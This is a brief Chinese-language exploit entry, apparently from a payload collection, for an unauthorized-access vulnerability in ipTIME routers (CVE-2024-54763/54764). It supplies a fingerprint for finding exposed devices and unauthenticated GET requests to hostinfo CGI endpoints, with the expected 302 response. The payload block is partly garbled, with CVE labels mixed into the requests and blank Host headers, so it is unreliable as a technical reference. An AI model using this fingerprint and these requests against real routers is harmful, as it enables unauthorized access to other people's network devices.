# ipTIME未授权访问漏洞

ipTIME ｜ 未授权访问 ｜ —
- **指纹**：`title="ipTIME"`
- **请求**：`GET /login/hostinfo.cgi HTTP/1.1`

**Payload**
```
**CVE-2024-54763**
Content-Type: application/json
Host:
**CVE-2024-54764**
GET /login/hostinfo2.cgi HTTP/1.1
Content-Type: application/json
Host:
```
- **响应特征**：302